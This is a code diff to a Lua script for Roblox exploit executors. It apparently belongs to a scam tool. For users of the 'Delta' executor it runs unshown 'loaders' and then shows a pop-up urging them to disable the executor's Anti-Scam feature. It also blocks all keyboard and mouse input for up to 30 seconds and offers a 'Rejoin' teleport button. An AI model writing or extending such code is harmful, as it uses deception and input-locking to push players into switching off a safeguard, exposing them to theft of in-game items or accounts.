@@ -72,7 +72,7 @@ local function showDeltaWarning()
     Label.TextColor3 = Color3.fromRGB(255, 255, 255)
     Label.TextWrapped = true
     Label.Text = [[
-Script requires the teleport function, but it was blocked due to the Anti-Scam feature.
+Script requires the teleport function, but it blocked due to the Anti-Scam feature.
 
 To disable this feature:
 
@@ -96,3 +96,52 @@ To disable this feature:
 
     local Button = Instance.new("TextButton")
     Button.Parent = Frame
+    Button.Size = UDim2.new(0, 140, 0, 40)
+    Button.Position = UDim2.new(0.5, -70, 1, -50)
+    Button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Text = "Rejoin"
+    Button.Font = Enum.Font.GothamBold
+    Button.TextSize = 18
+    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 8)
+
+    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 460, 0, 260),
+        Position = UDim2.new(0.5, -230, 0.5, -130)
+    }):Play()
+
+    -- Freeze player
+    freezePlayer()
+    ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
+    ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
+
+    -- Button click unfreeze + teleport
+    Button.MouseButton1Click:Connect(function()
+        ContextActionService:UnbindAction("FreezeAllInputs")
+        ContextActionService:UnbindAction("FreezeAllKeys")
+        TeleportService:Teleport(game.PlaceId, player)
+    end)
+
+    -- Auto-unfreeze after 30 seconds
+    task.delay(30, function()
+        ContextActionService:UnbindAction("FreezeAllInputs")
+        ContextActionService:UnbindAction("FreezeAllKeys")
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 16
+                humanoid.JumpPower = 50
+                humanoid.AutoRotate = true
+            end
+        end
+    end)
+end
+
+-- Main execution
+if executorName == "Delta" then
+    runLoaders()        -- loaders first
+    showDeltaWarning()  -- then warning + freeze
+else
+    runLoaders()        -- all others: loaders only
+end
